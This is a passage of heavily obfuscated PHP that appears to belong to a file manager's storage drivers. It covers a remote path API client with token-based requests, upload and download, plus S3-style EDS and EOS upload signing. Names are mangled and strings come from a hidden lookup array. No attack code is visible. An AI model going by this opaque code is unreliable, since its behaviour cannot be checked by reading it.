($Å®”íå·[$á¹ÉÀ’[569]] != $…Ş®’‘Ë) { return !1; } if ($¾­À¾×€[$á¹ÉÀ’[601]][$á¹ÉÀ’[1528]]) { $this->uploadChunkSize = $¾­À¾×€[$á¹ÉÀ’[601]][$á¹ÉÀ’[1528]]; } $¸ºøÅäí = array($á¹ÉÀ’[1525] => $á¹ÉÀ’[1529], $á¹ÉÀ’[1485] => $…Ş®’‘Ë, $á¹ÉÀ’[1484] => $ûÂ Âº¨); $¾­À¾×€ = $this->uploadSend($­ùŠáêñ, $á¹ÉÀ’[12], $¸ºøÅäí, $ÀİşÍ„ã); if (!is_array($¾­À¾×€) || empty($¾­À¾×€[$á¹ÉÀ’[601]])) { return !1; } return $this->pathApiDecode($¾­À¾×€[$á¹ÉÀ’[601]]); } private function uploadSend($£¼îª, $ãêè¶°à, $ÌõÍ“¨İ, $Úœá²„û = '') { $°¤ö´É£ =& $_SERVER[¤øïŠ‹²]; $ÌõÍ“¨İ[$°¤ö´É£[32]] = get_path_this($£¼îª); $ÌõÍ“¨İ[$°¤ö´É£[98]] = $this->pathApiEncode(get_path_father($£¼îª)); if ($Úœá²„û) { $ÌõÍ“¨İ[$°¤ö´É£[1530]] = $Úœá²„û; } if ($ãêè¶°à) { $ÌõÍ“¨İ[$°¤ö´É£[243]] = $°¤ö´É£[1345] . $ãêè¶°à; } return $this->requestSend($°¤ö´É£[1520], $ÌõÍ“¨İ); } protected function pathApiEncode($Æ§Æ®‚Ş) { $Ç…À¶õÁ =& $_SERVER[¤øïŠ‹²]; $ÔÆ·ÖÏê = $this->_config[$Ç…À¶õÁ[1503]]; $ëÂ¡Á—ê = strlen($ÔÆ·ÖÏê); if (substr($Æ§Æ®‚Ş, 0, $ëÂ¡Á—ê) == $ÔÆ·ÖÏê) { return $Æ§Æ®‚Ş; } return $ÔÆ·ÖÏê . ltrim($Æ§Æ®‚Ş, $Ç…À¶õÁ[8]); } protected function pathApiDecode($©ÈÊ°ï¼) { $¼È˜…ÂØ =& $_SERVER[¤øïŠ‹²]; $…áÑ’Êş = $this->_config[$¼È˜…ÂØ[1503]]; $Òì½Ô…å = strlen($…áÑ’Êş); if (substr($©ÈÊ°ï¼, 0, $Òì½Ô…å) !== $…áÑ’Êş) { return $©ÈÊ°ï¼; } return $this->_config[$¼È˜…ÂØ[1303]] . ltrim(substr($©ÈÊ°ï¼, $Òì½Ô…å), $¼È˜…ÂØ[8]); } private function pathInfoParse(&$ûÌ«Ò˜‹) { $ÕÇ§Á‹ =& $_SERVER[¤øïŠ‹²]; $€™†öœ = $this->_config; $¶õû¾Ëì = $€™†öœ[$ÕÇ§Á‹[582]]; if (!$ûÌ«Ò˜‹ || !is_array($ûÌ«Ò˜‹)) { return $ûÌ«Ò˜‹; } static $ñûªÙÂ¬ = array(); $ó’Ïí¤ƒ = $ñûªÙÂ¬[$¶õû¾Ëì[$ÕÇ§Á‹[694]]]; if (!is_array($ó’Ïí¤ƒ)) { $ğà†øí = LNG($ÕÇ§Á‹[1531]); $§²ù£âã = $€™†öœ[$ÕÇ§Á‹[586]][$ÕÇ§Á‹[101]]; $„‡¬‘ê = parse_url($€™†öœ[$ÕÇ§Á‹[586]][$ÕÇ§Á‹[1532]]); $£çÂ”É = $€™†öœ[$ÕÇ§Á‹[586]][$ÕÇ§Á‹[1533]]; $ó’Ïí¤ƒ = array($ÕÇ§Á‹[1534] => $§²ù£âã[$ÕÇ§Á‹[32]] . $ÕÇ§Á‹[1016] . $£çÂ”É . $ÕÇ§Á‹[1345] . $„‡¬‘ê[$ÕÇ§Á‹[219]] . $ÕÇ§Á‹[1018], $ÕÇ§Á‹[1535] => $ğà†øí . $ÕÇ§Á‹[1082] . $€™†öœ[$ÕÇ§Á‹[586]][$ÕÇ§Á‹[1532]] . $ÕÇ§Á‹[1536] . LNG($ÕÇ§Á‹[1537]) . $ÕÇ§Á‹[1082] . $£çÂ”É, $ÕÇ§Á‹[1538] => LNG($ÕÇ§Á‹[1539]) . $ÕÇ§Á‹[1540] . $€™†öœ[$ÕÇ§Á‹[586]][$ÕÇ§Á‹[1532]] . $ÕÇ§Á‹[59] . LNG($ÕÇ§Á‹[1541]) . $ÕÇ§Á‹[1540] . $§²ù£âã[$ÕÇ§Á‹[608]], $ÕÇ§Á‹[1533] => array($ÕÇ§Á‹[32] => $£çÂ”É, $ÕÇ§Á‹[1542] => $ÕÇ§Á‹[1543]), $ÕÇ§Á‹[1544] => Action($ÕÇ§Á‹[1489])->shareTargetMake($¶õû¾Ëì[$ÕÇ§Á‹[1500]])); $ñûªÙÂ¬[$¶õû¾Ëì[$ÕÇ§Á‹[694]]] = $ó’Ïí¤ƒ; } unset($ûÌ«Ò˜‹[$ÕÇ§Á‹[204]]); unset($ûÌ«Ò˜‹[$ÕÇ§Á‹[610]]); unset($ûÌ«Ò˜‹[$ÕÇ§Á‹[201]]); unset($ûÌ«Ò˜‹[$ÕÇ§Á‹[595]]); $ûÌ«Ò˜‹[$ÕÇ§Á‹[1545]] = !0; $ûÌ«Ò˜‹[$ÕÇ§Á‹[245]] = $€™†öœ[$ÕÇ§Á‹[1507]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[246]] = $€™†öœ[$ÕÇ§Á‹[1508]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[508]] = $€™†öœ[$ÕÇ§Á‹[1505]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[1533]] = $ó’Ïí¤ƒ[$ÕÇ§Á‹[1533]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[1546]] = $¶õû¾Ëì[$ÕÇ§Á‹[244]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[1547]] = $¶õû¾Ëì[$ÕÇ§Á‹[99]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[1548]] = $ó’Ïí¤ƒ[$ÕÇ§Á‹[1538]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[1544]] = $ó’Ïí¤ƒ[$ÕÇ§Á‹[1544]]; $‹È•İ±Œ = explode($ÕÇ§Á‹[8], trim($ûÌ«Ò˜‹[$ÕÇ§Á‹[608]], $ÕÇ§Á‹[8])); $‹È•İ±Œ[0] = $ó’Ïí¤ƒ[$ÕÇ§Á‹[1534]]; $ûÌ«Ò˜‹[$ÕÇ§Á‹[608]] = implode($ÕÇ§Á‹[8], $‹È•İ±Œ); if (count($‹È•İ±Œ) > 1) { unset($ûÌ«Ò˜‹[$ÕÇ§Á‹[1544]]); } if (count($‹È•İ±Œ) == 1) { if ($ûÌ«Ò˜‹[$ÕÇ§Á‹[33]] == $ÕÇ§Á‹[89]) { $ûÌ«Ò˜‹[$ÕÇ§Á‹[32]] = $ó’Ïí¤ƒ[$ÕÇ§Á‹[1534]]; } array_set_value($ûÌ«Ò˜‹, $ÕÇ§Á‹[1549], $ó’Ïí¤ƒ[$ÕÇ§Á‹[1535]]); } $»ƒĞË§Ê = array($ÕÇ§Á‹[1550], $ÕÇ§Á‹[1469], $ÕÇ§Á‹[1551], $ÕÇ§Á‹[1552]); foreach ($»ƒĞË§Ê as $²àö£) { $®öÚ£Ğ“ = $this->urlAuto(_get($ûÌ«Ò˜‹, $²àö£, $ÕÇ§Á‹[12])); if ($®öÚ£Ğ“) { array_set_value($ûÌ«Ò˜‹, $²àö£, $®öÚ£Ğ“); } } } private function _info($©Ãî‚Ğ¹, $´©Ïµûî = false) { $’áÈõÇš =& $_SERVER[¤øïŠ‹²]; $å§Â©ö§ = $this->_config; if (!$å§Â©ö§) { return !1; } static $ìßêÅ¯´ = array(); if (isset($ìßêÅ¯´[$©Ãî‚Ğ¹]) && is_array($ìßêÅ¯´[$©Ãî‚Ğ¹])) { return $ìßêÅ¯´[$©Ãî‚Ğ¹]; } if ((!$©Ãî‚Ğ¹ || !trim($©Ãî‚Ğ¹, $’áÈõÇš[8])) && !$´©Ïµûî) { $—º“Ğ¹ú = $å§Â©ö§[$’áÈõÇš[586]][$’áÈõÇš[101]]; if (!$—º“Ğ¹ú) { return !1; } $—º“Ğ¹ú[$’áÈõÇš[608]] = $’áÈõÇš[12]; $—º“Ğ¹ú[$’áÈõÇš[98]] = $å§Â©ö§[$’áÈõÇš[1303]]; $this->pathInfoParse($—º“Ğ¹ú); return $—º“Ğ¹ú; } $­¨£ôŒ = $this->request($’áÈõÇš[1553], array($©Ãî‚Ğ¹, $´©Ïµûî)); $ìßêÅ¯´[$©Ãî‚Ğ¹] = $­¨£ôŒ; return $­¨£ôŒ; } private function _fileSubstr($¯ˆ§»Á, $Ó¡ÚÃ¬ã = 0, $Õ—ÑõÅÑ = -1) { $êÒ®¥Á‚ =& $_SERVER[¤øïŠ‹²]; $¥½‘÷Àî = $this->_fileLink($¯ˆ§»Á); if (!$¥½‘÷Àî) { return !1; } $Ì°äÉº‚ = !1; if ($Õ—ÑõÅÑ > 0) { $Õ’°Ç‡‘ = $£Ë–ìú + $Õ—ÑõÅÑ - 1; $Ì°äÉº‚ = array($êÒ®¥Á‚[1554] . $£Ë–ìú . $êÒ®¥Á‚[483] . $Õ’°Ç‡‘); } $ÏÅÒ = url_request($¥½‘÷Àî, $êÒ®¥Á‚[1555], !1, $Ì°äÉº‚); return $ÏÅÒ[$êÒ®¥Á‚[851]] ? $ÏÅÒ[$êÒ®¥Á‚[1339]] : !1; } private function _download($õÜ©«™, $ìØòÙÏ) { $ü¯Ä†ùÑ = $this->_fileLink($õÜ©«™); if (!$ü¯Ä†ùÑ) { return !1; } Downloader::start($ü¯Ä†ùÑ, $ìØòÙÏ); return $ìØòÙÏ; } private function _fileLink($‘çæÁ‘à, $ĞÎ®… = '') { $ÕöÃş–— =& $_SERVER[¤øïŠ‹²]; $„©¢ï×Ñ = $this->pathApiEncode($‘çæÁ‘à); return $this->requestMakeUrl($ÕöÃş–—[1556], array($ÕöÃş–—[98] => $„©¢ï×Ñ)) . $ĞÎ®…; } private function urlAuto($•Ò÷£·ƒ) { $©òÈÑŠ¶ =& $_SERVER[¤øïŠ‹²]; if (!$•Ò÷£·ƒ) { return $•Ò÷£·ƒ; } $±¢ë‡ø° = parse_url($•Ò÷£·ƒ); $ ¬›ÀìÇ = $•Ò÷£·ƒ; if ($this->_config[$©òÈÑŠ¶[1506]] && $±¢ë‡ø°[$©òÈÑŠ¶[218]] == $©òÈÑŠ¶[162] && Input::check($±¢ë‡ø°[$©òÈÑŠ¶[1557]], $©òÈÑŠ¶[1558])) { $•Ò÷£·ƒ = $©òÈÑŠ¶[230] . substr($•Ò÷£·ƒ, 7); } $¹è¼ÈäÌ = $©òÈÑŠ¶[1559] . rawurlencode(rtrim($this->config[$©òÈÑŠ¶[1503]], $©òÈÑŠ¶[8])); if (strstr($•Ò÷£·ƒ, $¹è¼ÈäÌ)) { $Âªè´Ë¥ = strstr($•Ò÷£·ƒ, $©òÈÑŠ¶[87]) ? $©òÈÑŠ¶[297] : $©òÈÑŠ¶[87]; $•Ò÷£·ƒ = $•Ò÷£·ƒ . $Âªè´Ë¥ . $©òÈÑŠ¶[1560] . $this->authToken; } return $•Ò÷£·ƒ; } private function request($Ğüíë”, $õ­©‘‹Ø) { $ŠÛŞ®–Ò =& $_SERVER[¤øïŠ‹²]; if (!is_array($õ­©‘‹Ø)) { $õ­©‘‹Ø = array(); } for ($ı¯şï‰Ö = 0; $ı¯şï‰Ö < 4; $ı¯şï‰Ö++) { if (!isset($õ­©‘‹Ø[$ı¯şï‰Ö])) { $õ­©‘‹Ø[$ı¯şï‰Ö] = $ŠÛŞ®–Ò[12]; } } $Å¶áø¶é = array($ŠÛŞ®–Ò[1553] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1553], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[1563], $ŠÛŞ®–Ò[1564] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[1565] => array(array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])), $ŠÛŞ®–Ò[1566] => $õ­©‘‹Ø[1] ? $ŠÛŞ®–Ò[102] : $ŠÛŞ®–Ò[12])), $ŠÛŞ®–Ò[1515] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1567], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1564] => $ŠÛŞ®–Ò[1568], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])), $ŠÛŞ®–Ò[1569] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1570], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1564] => $ŠÛŞ®–Ò[1571], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])), $ŠÛŞ®–Ò[1516] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1572], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[1574], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0], $ŠÛŞ®–Ò[181] => $õ­©‘‹Ø[1])), $ŠÛŞ®–Ò[1492] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1492], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[601], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0], $ŠÛŞ®–Ò[181] => $õ­©‘‹Ø[1], $ŠÛŞ®–Ò[1530] => $õ­©‘‹Ø[2])), $ŠÛŞ®–Ò[1493] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1493], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[601], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0], $ŠÛŞ®–Ò[1530] => $õ­©‘‹Ø[2])), $ŠÛŞ®–Ò[647] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1575], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[1576], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[1577], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[1565] => array(array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])), $ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[1], $ŠÛŞ®–Ò[1530] => $õ­©‘‹Ø[2])), $ŠÛŞ®–Ò[649] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1578], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[1576], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[1577], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[1565] => array(array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])), $ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[1], $ŠÛŞ®–Ò[1530] => $õ­©‘‹Ø[2])), $ŠÛŞ®–Ò[1280] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1579], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[1563], $ŠÛŞ®–Ò[1564] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[1565] => array(array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0])))), $ŠÛŞ®–Ò[1496] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1580], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[601], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => $õ­©‘‹Ø[0], $ŠÛŞ®–Ò[1581] => $õ­©‘‹Ø[1])), $ŠÛŞ®–Ò[119] => array($ŠÛŞ®–Ò[1561] => $ŠÛŞ®–Ò[1520], $ŠÛŞ®–Ò[1562] => $ŠÛŞ®–Ò[98], $ŠÛŞ®–Ò[1573] => $ŠÛŞ®–Ò[601], $ŠÛŞ®–Ò[1302] => array($ŠÛŞ®–Ò[98] => get_path_father($õ­©‘‹Ø[0]), $ŠÛŞ®–Ò[243] => $õ­©‘‹Ø[1] ? $ŠÛŞ®–Ò[1345] . $õ­©‘‹Ø[1] : $ŠÛŞ®–Ò[12], $ŠÛŞ®–Ò[32] => get_path_this($õ­©‘‹Ø[0]), $ŠÛŞ®–Ò[1530] => $õ­©‘‹Ø[2]))); $ê½ÄĞ²ê = $Å¶áø¶é[$Ğüíë”]; if (!$ê½ÄĞ²ê) { return !1; } $¤±Áš×Í = $ê½ÄĞ²ê[$ŠÛŞ®–Ò[1302]]; $Ö´¾ö´¿ = explode($ŠÛŞ®–Ò[50], $ê½ÄĞ²ê[$ŠÛŞ®–Ò[1562]]); foreach ($Ö´¾ö´¿ as $Ìğß¡çí) { $¹ğ£…¨ô = $this->pathApiEncode(_get($¤±Áš×Í, $Ìğß¡çí)); array_set_value($¤±Áš×Í, $Ìğß¡çí, $¹ğ£…¨ô); } if ($Ğüíë” == $ŠÛŞ®–Ò[1496] && trim($ê½ÄĞ²ê[$ŠÛŞ®–Ò[1302]][$ŠÛŞ®–Ò[98]], $ŠÛŞ®–Ò[8]) == trim($this->_config[$ŠÛŞ®–Ò[1303]], $ŠÛŞ®–Ò[8])) { return $ê½ÄĞ²ê[$ŠÛŞ®–Ò[1302]][$ŠÛŞ®–Ò[98]]; } $ã§ë­ÉÕ = $this->requestSend($ê½ÄĞ²ê[$ŠÛŞ®–Ò[1561]], $¤±Áš×Í); if (!$ã§ë­ÉÕ) { return !1; } $óî–¯œ— = $ã§ë­ÉÕ[$ŠÛŞ®–Ò[1339]]; if ($ê½ÄĞ²ê[$ŠÛŞ®–Ò[1573]]) { $óî–¯œ— = _get($ã§ë­ÉÕ, $ê½ÄĞ²ê[$ŠÛŞ®–Ò[1573]]); } if (is_string($óî–¯œ—) && !$ê½ÄĞ²ê[$ŠÛŞ®–Ò[1564]]) { return $this->pathApiDecode($óî–¯œ—); } if (!is_array($óî–¯œ—) || !$óî–¯œ—) { return $óî–¯œ—; } $ŞœƒœŞ§ = explode($ŠÛŞ®–Ò[50], $ê½ÄĞ²ê[$ŠÛŞ®–Ò[1564]]); foreach ($ŞœƒœŞ§ as $Ìğß¡çí) { $½¡ş¾İ¦ = explode($ŠÛŞ®–Ò[10], $Ìğß¡çí); $öÃª½Û = array_search($ŠÛŞ®–Ò[1582], $½¡ş¾İ¦); if ($öÃª½Û === !1) { $¹ğ£…¨ô = $this->pathApiDecode(_get($óî–¯œ—, $Ìğß¡çí)); array_set_value($óî–¯œ—, $Ìğß¡çí, $¹ğ£…¨ô); if ($Ğüíë” == $ŠÛŞ®–Ò[1553] && $Ìğß¡çí == $ŠÛŞ®–Ò[98]) { $this->pathInfoParse($óî–¯œ—); } if ($Ğüíë” == $ŠÛŞ®–Ò[1515] && $Ìğß¡çí == $ŠÛŞ®–Ò[1583]) { $this->pathInfoParse($óî–¯œ—[$ŠÛŞ®–Ò[1490]]); } if ($Ğüíë” == $ŠÛŞ®–Ò[1515]) { $óî–¯œ—[$ŠÛŞ®–Ò[1584]] = array(); } continue; } $¥ıšÔƒÈ = implode($ŠÛŞ®–Ò[10], array_slice($½¡ş¾İ¦, $öÃª½Û + 1)); $ñ¥í«¿ç = array(); if ($öÃª½Û === 0) { $ñ¥í«¿ç =& $óî–¯œ—; } if ($öÃª½Û === 1) { $ñ¥í«¿ç =& $óî–¯œ—[$½¡ş¾İ¦[0]]; } if ($öÃª½Û === 2) { $ñ¥í«¿ç =& $óî–¯œ—[$½¡ş¾İ¦[0]][$½¡ş¾İ¦[1]]; } foreach ($ñ¥í«¿ç as $Ìğß¡çí => $ıéš±‰ù) { $¹ğ£…¨ô = $this->pathApiDecode(_get($ıéš±‰ù, $¥ıšÔƒÈ)); array_set_value($ñ¥í«¿ç[$Ìğß¡çí], $¥ıšÔƒÈ, $¹ğ£…¨ô); $this->pathInfoParse($ñ¥í«¿ç[$Ìğß¡çí]); } unset($ñ¥í«¿ç); } return $óî–¯œ—; } private function requestMakeUrl($’ˆ‚èÈã, $áçıöœ¢ = '') { $Œ•àŸšÉ =& $_SERVER[¤øïŠ‹²]; $Ø•ïÁ–½ = $this->_config; if (!$this->authToken) { return !1; } $Ñ×ˆë‚¤ = $this->requestQuery($áçıöœ¢, !0) . $Œ•àŸšÉ[1585] . $this->authToken; $¥¿ğ»ŒĞ = rtrim($Ø•ïÁ–½[$Œ•àŸšÉ[586]][$Œ•àŸšÉ[1532]], $Œ•àŸšÉ[8]) . $Œ•àŸšÉ[1586] . $’ˆ‚èÈã; return $¥¿ğ»ŒĞ . $Œ•àŸšÉ[1587] . rawurlencode($Ø•ïÁ–½[$Œ•àŸšÉ[586]][$Œ•àŸšÉ[1504]]) . $Ñ×ˆë‚¤; } private function requestAuthToken() { $”×˜œôß =& $_SERVER[¤øïŠ‹²]; $ÜÂÛ®ˆ’ = $this->_config; if (!$ÜÂÛ®ˆ’) { return !1; } $ô «¼î€ = _get($ÜÂÛ®ˆ’, $”×˜œôß[1588]); $§é®× = array_find_by_field($ÜÂÛ®ˆ’[$”×˜œôß[586]][$”×˜œôß[1544]], $”×˜œôß[1589], $ô «¼î€); if (!$§é®×) { return !1; } $Ú·„–» = $§é®×[$”×˜œôß[1590]] . $”×˜œôß[1591] . $§é®×[$”×˜œôß[1293]]; $óÔ’…ÜÒ = $”×˜œôß[1592] . $this->pathParse[$”×˜œôß[493]] . $”×˜œôß[483] . $Ú·„–»; $ªşÎõ©® = Cache::get($óÔ’…ÜÒ); if ($ªşÎõ©®) { return $ªşÎõ©®; } $ªşÎõ©® = Mcrypt::encode($Ú·„–», $”×˜œôß[1593]); Cache::set($óÔ’…ÜÒ, $ªşÎõ©®, 3600 * 24 * 60); return $ªşÎõ©®; } private function requestQuery($û°Œíş = '', $ÏÛÌİ©“ = false) { if (!$û°Œíş || !is_array($û°Œíş)) { return $û°Œíş; } foreach ($û°Œíş as $×ØÓÊ½² => $ï—×‘·) { if (is_array($ï—×‘·)) { $û°Œíş[$×ØÓÊ½²] = json_encode($ï—×‘·); } } return $ÏÛÌİ©“ ? $_SERVER[¤øïŠ‹²][297] . http_build_query($û°Œíş) : $û°Œíş; } private function requestSend($¶ùçí¬Ç, $¼Á…˜ãĞ) { $”ˆ´†¨Í =& $_SERVER[¤øïŠ‹²]; $ù‡ŸÅ — = $this->requestMakeUrl($¶ùçí¬Ç); if (!$ù‡ŸÅ —) { return !1; } $Â›û±éè = url_request($ù‡ŸÅ —, $”ˆ´†¨Í[300], $this->requestQuery($¼Á…˜ãĞ), !1, !1, !0); $éÙÌãÚÌ = $Â›û±éè[$”ˆ´†¨Í[1339]]; if (!is_array($éÙÌãÚÌ) || !$éÙÌãÚÌ || !$éÙÌãÚÌ[$”ˆ´†¨Í[1349]] || intval($éÙÌãÚÌ[$”ˆ´†¨Í[1349]]) > 500) { $‚á˜Â† = is_array($éÙÌãÚÌ) ? $éÙÌãÚÌ[$”ˆ´†¨Í[1339]] : $éÙÌãÚÌ . $”ˆ´†¨Í[12]; if (!$Â›û±éè[$”ˆ´†¨Í[851]]) { $‚á˜Â† .= $”ˆ´†¨Í[1594] . $Â›û±éè[$”ˆ´†¨Í[1349]] . $”ˆ´†¨Í[188]; } IO::errorTips($‚á˜Â†, !1); return !1; } return $éÙÌãÚÌ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ÎÀŸ½È) { parent::__construct($ÎÀŸ½È); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÅÉ½¯ˆü) { parent::__construct($ÅÉ½¯ˆü); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } public function uploadFormData($ÒÌ¤÷ç¤, $İô”Àñ = 3600) { $ƒ³ò©š÷ =& $_SERVER[¤øïŠ‹²]; $ş äıƒ = $ƒ³ò©š÷[242]; $À¥†œÁñ = $ƒ³ò©š÷[270]; $ôçÂŞö³ = $ƒ³ò©š÷[73]; $—ÁÕè¥¸ = gmdate($ƒ³ò©š÷[271]); $ö„ø‚˜ß = gmdate($ƒ³ò©š÷[272]); $Ë§®®Í = $ƒ³ò©š÷[273]; $ÌÀ÷”Ş’ = $İô”Àñ . $ƒ³ò©š÷[12]; $øŒÂ‚®¨ = $ƒ³ò©š÷[274]; $ß‘ÖŠ‹ã = array($this->accessKey, $ö„ø‚˜ß, $this->region, $ôçÂŞö³, $Ë§®®Í); $‹Óàôé  = implode($ƒ³ò©š÷[8], $ß‘ÖŠ‹ã); $±ìËéğÍ = array($ƒ³ò©š÷[275] => gmdate($ƒ³ò©š÷[1474], strtotime($ƒ³ò©š÷[277])), $ƒ³ò©š÷[278] => array(array($ƒ³ò©š÷[279] => $this->bucket), array($ƒ³ò©š÷[318] => $ş äıƒ), array($ƒ³ò©š÷[280], $ƒ³ò©š÷[281], $ƒ³ò©š÷[12]), array($ƒ³ò©š÷[280], $ƒ³ò©š÷[282], $ƒ³ò©š÷[12]), array($ƒ³ò©š÷[280], $ƒ³ò©š÷[319], $ƒ³ò©š÷[12]), array($ƒ³ò©š÷[283] => $øŒÂ‚®¨), array($ƒ³ò©š÷[284] => $‹Óàôé ), array($ƒ³ò©š÷[285] => $À¥†œÁñ), array($ƒ³ò©š÷[286] => $—ÁÕè¥¸), array($ƒ³ò©š÷[287] => $ÌÀ÷”Ş’))); $”üá•¿ = base64_encode(json_encode($±ìËéğÍ)); $—…¿Ğ×œ = hash_hmac($ƒ³ò©š÷[288], $ö„ø‚˜ß, $ƒ³ò©š÷[289] . $this->secret, !0); $•—ø¾š² = hash_hmac($ƒ³ò©š÷[288], $this->region, $—…¿Ğ×œ, !0); $Í”Û®¬ = hash_hmac($ƒ³ò©š÷[288], $ôçÂŞö³, $•—ø¾š², !0); $©öÍğ”“ = hash_hmac($ƒ³ò©š÷[288], $Ë§®®Í, $Í”Û®¬, !0); $òï»ì†„ = hash_hmac($ƒ³ò©š÷[288], $”üá•¿, $©öÍğ”“); $Ş¾Ù‚ÔÅ = array($ƒ³ò©š÷[259] => $ƒ³ò©š÷[12], $ƒ³ò©š÷[306] => $ƒ³ò©š÷[12], $ƒ³ò©š÷[318] => $ş äıƒ, $ƒ³ò©š÷[283] => $øŒÂ‚®¨, $ƒ³ò©š÷[290] => $”üá•¿, $ƒ³ò©š÷[320] => $‹Óàôé , $ƒ³ò©š÷[321] => $À¥†œÁñ, $ƒ³ò©š÷[322] => $—ÁÕè¥¸, $ƒ³ò©š÷[323] => $ÌÀ÷”Ş’, $ƒ³ò©š÷[324] => $òï»ì†„, $ƒ³ò©š÷[219] => $this->getHost()); return $Ş¾Ù‚ÔÅ; } } goto f©—œíá ; cÌ•Ü›î†Ø: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($áÃë—‚© = false, $Œ±ÕĞ¸À = '', $›äï–€ = false, $îëÃÓÌ = true) { $¢ˆü¸ë =& $_SERVER[¤øïŠ‹²]; $ªœŒöäÏ = $this->cacheGet($Œ±ÕĞ¸À); $…‰ğ¤Ãš = $this->optionDefault($Œ±ÕĞ¸À); $…‰ğ¤Ãš = is_array($…‰ğ¤Ãš) ? $…‰ğ¤Ãš : array(); if (is_array($ªœŒöäÏ)) { if ($îëÃÓÌ) { $ªœŒöäÏ = array_merge($…‰ğ¤Ãš, $ªœŒöäÏ); } return $áÃë—‚© ? isset($ªœŒöäÏ[$áÃë—‚©]) ? $ªœŒöäÏ[$áÃë—‚©] : null : $ªœŒöäÏ; } $÷•Îİ«Œ = $this->filterWhere(array($¢ˆü¸ë[33] => $Œ±ÕĞ¸À)); $ªœŒöäÏ = $this->where($÷•Îİ«Œ)->select(); $ªœŒöäÏ = array_to_keyvalue($ªœŒöäÏ, $¢ˆü¸ë[106], $¢ˆü¸ë[462]); foreach ($ªœŒöäÏ as $€•Ÿ´ê  => $úŞğ°Ïé) { if ($›äï–€ || in_array($€•Ÿ´ê , $this->jsonField)) { $ªœŒöäÏ[$€•Ÿ´ê ] = json_decode($úŞğ°Ïé, !0); } } $this->cacheSet($Œ±ÕĞ¸À, $ªœŒöäÏ); if ($îëÃÓÌ) { $ªœŒöäÏ = array_merge($…‰ğ¤Ãš, $ªœŒöäÏ); } return $áÃë—‚© ? $ªœŒöäÏ[$áÃë—‚©] : $ªœŒöäÏ; } public function set($¡µè×°‰, $ÃÉøä¥À = false, $ø÷”…è = '') { $ÁıœÈ÷ğ =& $_SERVER[¤øïŠ‹²]; if (!$¡µè×°‰) { return !0; } $¯šŠˆ¥Ó = $this->get(!1, $ø÷”…è, !1, !1); $¯šŠˆ¥Ó = is_array($¯šŠˆ¥Ó) ? $¯šŠˆ¥Ó : array(); $ƒ›§¹¡³ = array(); $§¥ğú÷¯ = array(); $üıç–á = array(); $‰­¡ç‘“ = is_array($¡µè×°‰) ? $¡µè×°‰ : array($¡µè×°‰ => $ÃÉøä¥À); $‰Ã¬Æı¢ = $this->filterWhere(array($ÁıœÈ÷ğ[33] => $ø÷”…è)); foreach ($‰­¡ç‘“ as $¯–Ü¢¡ => $Ô¸òŠÅª) { if (is_array($Ô¸òŠÅª)) { $Ô¸òŠÅª = json_encode_force($Ô¸òŠÅª); } $this->checkLength($Ô¸òŠÅª, !1, $this->tableName . 